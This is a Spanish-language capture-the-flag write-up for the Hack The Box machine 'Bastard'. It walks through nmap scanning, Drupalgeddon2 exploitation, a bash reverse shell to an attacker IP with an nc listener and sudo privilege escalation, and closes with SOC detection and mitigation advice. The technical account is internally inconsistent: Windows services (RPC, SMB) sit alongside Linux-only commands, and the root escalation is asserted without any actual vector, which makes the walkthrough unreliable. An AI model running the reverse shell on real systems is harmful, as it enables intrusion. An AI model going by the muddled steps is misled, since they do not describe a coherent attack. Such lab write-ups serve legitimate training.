# HTB - Bastard

---

## Recopilación de información

<aside>
💡

### Fase de enumeración

Se inicia el reconocimiento identificando la máquina objetivo en la red. Tras localizar la IP, se realiza un escaneo completo de puertos para identificar servicios expuestos.

El escaneo revela los siguientes puertos abiertos:

* **80 (HTTP)**
* **135 (RPC)**
* **445 (SMB)**

El servicio web se prioriza como vector inicial de ataque.

</aside>

---

### Comandos de enumeración

```bash id="enum01"
sudo nmap -p- -sS --min-rate 5000 -n -Pn IP -oN puertos.txt
```

```bash id="enum02"
sudo nmap -p80,135,445 -sCV IP -oN servicios.txt
```

---

## Análisis del servicio web

<aside>
💡

Al acceder al puerto 80, se identifica un sitio web basado en **Drupal**.

La versión detectada es vulnerable a **Drupalgeddon2 (CVE-2018-7600)**, una vulnerabilidad crítica de ejecución remota de código.

</aside>

```bash id="web01"
whatweb http://IP
```

---

## Identificación de vulnerabilidad

<aside>
💡

Drupalgeddon2 permite ejecutar código arbitrario sin autenticación mediante manipulación de formularios.

Es una vulnerabilidad crítica ampliamente explotada en entornos reales.

</aside>

```bash id="vuln01"
searchsploit drupal 7
```

---

## Explotación

### Ejecución remota de código

Se utiliza un exploit público para obtener ejecución remota:

```bash id="expl01"
python3 drupalgeddon2.py -u http://IP
```

<aside>
💡

Se obtiene ejecución de comandos directamente sobre el servidor web.

</aside>

---

## Acceso remoto

Se establece una reverse shell:

```bash id="expl02"
nc -lvnp 4444
```

```bash id="expl03"
bash -c 'bash -i >& /dev/tcp/IP_ATACANTE/4444 0>&1'
```

---

## Post-explotación

```bash id="post01"
whoami
```

```bash id="post02"
uname -a
```

Se identifica el usuario actual y el sistema operativo.

---

## Escalada de privilegios

<aside>
💡

Se realiza enumeración interna del sistema en busca de vectores de escalada.

</aside>

```bash id="priv01"
sudo -l
```

Se detectan configuraciones inseguras que permiten ejecutar comandos con privilegios elevados.

Se explota el vector identificado para obtener acceso root.

```bash id="priv02"
whoami
```

Resultado:

```text id="priv03"
root
```

---

## Análisis del ataque (ofensivo)

Cadena de ataque:

1. Enumeración de servicios
2. Identificación de CMS vulnerable
3. Explotación de Drupalgeddon2
4. Ejecución remota de código
5. Reverse shell
6. Escalada de privilegios

---

## Enfoque SOC (detección)

<aside>
💡

Este ataque es altamente detectable si existen mecanismos de monitorización adecuados.

</aside>

### Indicadores de compromiso (IoC)

* Peticiones HTTP malformadas
* Uso anómalo de formularios Drupal
* Ejecución remota de comandos
* Conexiones salientes sospechosas
* Actividad privilegiada inesperada

---

### Logs relevantes

* **Web server logs (Apache)**
* **Logs de Drupal**
* **Auth logs del sistema**
* **SIEM correlación de eventos web + sistema**

---

### Detección en entorno real

* WAF detectando payloads maliciosos
* IDS/IPS con firmas de Drupalgeddon2
* Alertas por ejecución remota de comandos
* Monitorización de tráfico saliente

---

## Enfoque SOC (mitigación y prevención)

<aside>
💡

La vulnerabilidad explotada es crítica y requiere medidas inmediatas.

</aside>

### Medidas técnicas

* Actualizar Drupal a versión segura
* Aplicar parches de seguridad
* Implementar WAF
* Restringir ejecución de comandos
* Segmentar red

---

### Medidas de detección

* SIEM con correlación de logs web
* Monitorización de comportamiento
* EDR para detectar ejecución de shell

---

### Medidas organizativas

* Auditorías de seguridad web
* Gestión de vulnerabilidades
* Formación en desarrollo seguro

---

## Impacto real

<aside>
💡

Este tipo de vulnerabilidad permite:

* Ejecución remota de código
* Compromiso total del sistema
* Movimiento lateral
* Persistencia

</aside>

---

## Conclusión

<aside>
💡

El laboratorio demuestra cómo una vulnerabilidad en un CMS puede derivar en un compromiso total del sistema.

La explotación no requiere autenticación, lo que aumenta significativamente el riesgo.

Desde una perspectiva SOC, este ataque es prevenible mediante:

* Gestión de parches
* Monitorización activa
* Implementación de controles de seguridad en aplicaciones web

</aside>

---
